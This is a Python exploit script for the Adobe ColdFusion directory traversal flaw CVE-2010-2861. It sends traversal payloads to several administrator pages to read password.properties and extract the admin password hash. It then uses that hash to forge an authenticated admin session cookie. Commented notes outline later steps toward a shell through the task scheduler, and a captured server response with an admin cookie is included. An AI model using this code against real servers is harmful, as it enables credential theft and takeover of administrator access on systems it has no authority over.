#!/usr/bin/python


# Working GET request courtesy of carnal0wnage:
# http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
#
# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"




# CVE-2010-2861 - Adobe ColdFusion Unspecified Directory Traversal Vulnerability
# detailed information about the exploitation of this vulnerability:
# http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/

# leo 13.08.2010

import sys
import socket
import re
import hashlib
import hmac
import binascii
import time
import httplib
import gc

gc.disable()

if len(sys.argv) < 4:
    print "usage: %s <stage> <host> <port>" % sys.argv[0]   #   Screw the file path, I'll tell you the File Path: G0li4th
    print "example: %s 1 localhost 80" % sys.argv[0]        #   set while loop to try many paths   ../../../../../../../lib/password.properties
    print "       : %s 2 localhost 80 <Hash>"
    print "if successful, the file will be printed"
    sys.exit()

host = sys.argv[2]
port = sys.argv[3]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
# in case some directories are blocked
filenames = ("/CFIDE/wizards/common/_logintowizard.cfm", "/CFIDE/administrator/archives/index.cfm", "/cfide/install.cfm", "/CFIDE/administrator/entman/index.cfm", "/CFIDE/administrator/enter.cfm")
post = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

locale=%%00%s%%00a"""

# Everything from here on Constructed by G0li4th
post_cookie = """POST %s HTTP/1.1
Host: %s
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: %d

%s"""

get_sched = """GET /CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task HTTP/1.1
Host: %s
Connection: close
Cookie: %s
"""


def authenticate(hash):
    global s
    key = str(int(time.time()*1000))+"123"
    print key
    digest = hashlib.sha1
    hmacx = hmac.new(key,hash,digest).hexdigest().upper()
    #params = "cfadminPassword=%s%%2F&requestedURL=FCFIDE%%2Fenter.cfm%%3F&salt=%s&submit=Login" % (hmacx,key)
    params = "cfadminPassword=%s&requestedURL=/CFIDE/administrator/enter.cfm?&salt=%s&submit=Login" % (hmacx,key)

    #print params
    f='/CFIDE/administrator/enter.cfm'    
    s.send(post_cookie % (f, host, len(params), params))
    posted=post_cookie % (f,host,len(params),params)
    print "Posted: %s" % posted
    # wait for the login response, we should get something, but things keep dying.
    buf = ''
    while 1:
       buf_s = s.recv(1024)
       if len(buf_s) == 0:
           break
       buf += buf_s
    # print buf
    m = re.findall('Set-Cookie: CFAUTHORIZATION_cfadmin=[A-Za-z0-9]+;', buf, re.S)
    if "CFAUTHORIZATION_cfadmin" in buf:
            # title = m.groups(0)[0]
            # admin_pass = title.split("\n")[2].split("=")[1]
            print "Cookie Created Successfully"
            print "------------------------------"
            print m[0].split("=")[1].split(";")[0]
            print "------------------------------"
    return m[0].split("=")[1].split(";")[0]

def find_pass():
    global s
    paths = []
    i=0
    paths.append("../../../../../../../../../../../../../../../ColdFusion8/lib/password.properties")
    while (paths[i][3]!='C'):
        paths.append(paths[i][3:])
        i=i+1
    count=0
    for path in paths:
        for f in filenames:
            print "------------------------------"
            print "trying", f, path
            count=count+1
            
            s.send(post % (f, host, len(path) + 14, path))
            posted=post % (f,host,len(path)+14,path)
            print "Posted: %s" % posted
            buf = ""

            while 1:
                buf_s = s.recv(1024)
                if len(buf_s) == 0:
                    break
                buf += buf_s
            # s.shutdown(1)
            # s.close()
            # print buf
            m = re.search('<title>(.*)</title>', buf, re.S)
            if "password" in buf:
                title = m.groups(0)[0]
                admin_pass = title.split("\n")[2].split("=")[1]
                print "Password found after %s attempts" %count
                print "title from server in %s:" % f
                print "------------------------------"
                print m.groups(0)[0]
                print "------------------------------"

                return admin_pass

# Implementing the steps of this exploit individually, as currently Python is sending a [FIN ACK] after the 2nd HTTP request.
print sys.argv[1]
if int(sys.argv[1]) == 1:
    admin_pass = find_pass()
    # cookie= authenticate(admin_pass)
elif int(sys.argv[1]) == 2:
    admin_pass = sys.argv[4]
    cookie = authenticate(admin_pass)
else:
    print "Currently your stage is unavailable, please use one of the prepared stages"

# 


#   print "Admin Hash       = %s" % admin_pass
#   Admin Hash: AAFDC23870ECBCD3D557B6423A8982134E17927E
#   hmacx = createHMAC(admin_pass)
#   print "Calculated Hash  = %s" % hmacx                   
##  
##  I confirmed that these 2 functions do work properly.
##  The important thing that I need is the cookie, I never
##  need the HMAC after creating the session cookie.





#   HMAC Hash: CBBDD1D0C1A8D5355760EF620A4AB7AA56BCD798 -- will probably be different, but we can test with preset values.

##  STEPS IN METASPLOIT:
##  1) Find the directory
##  2) Capture the Password Hash and Cookie
##  3) Connect to ColdFusion using the passhash. This step is used to get a session cookie (for later use)
##  4) Determine OS
##  5) Begin the New Task Scheduler process
##  6) Create a new task with a random 6 letter name, start time and date, and cookie
##  7) Set job
##  8) Get a Shell

##  TODO: (G0li4th)
##  1) Find Directory           -> DONE
##  2) Capture Password Hash    -> DONE
##  3) Create Cookie            -> DONE
##  4) Determine OS             -> Not Needed, will hard-code 
##  5) Begin Task Scheduler     -> Incomplete
##  6) Create a new Task        -> Incomplete
##  7) Set job                  -> Incomplete
##  8) Get a Shell              -> Incomplete

##HTTP/1.1 302 Moved Temporarily
# Connection: close
# Date: Wed, 05 Aug 2015 21:39:38 GMT
# Server: Microsoft-IIS/6.0
# Set-Cookie: CFID=4867;expires=Fri, 28-Jul-2045 21:39:38 GMT;path=/
# Set-Cookie: CFTOKEN=17985520;expires=Fri, 28-Jul-2045 21:39:38 GMT;path=/
# Set-Cookie: CFAUTHORIZATION_cfadmin=;expires=Tue, 05-Aug-2014 21:39:38 GMT;path=/
# Set-Cookie: CFID=4867;path=/
# Set-Cookie: CFTOKEN=17985520;path=/
# Set-Cookie: CFAUTHORIZATION_cfadmin=YWRtaW46QUFGREMyMzg3MEVDQkNEM0Q1NTdCNjQyM0E4OTgyMTM0RTE3OTI3RTpjZmFkbWlu;path=/
# location: index.cfm
# Content-Type: text/html; charset=UTF-8
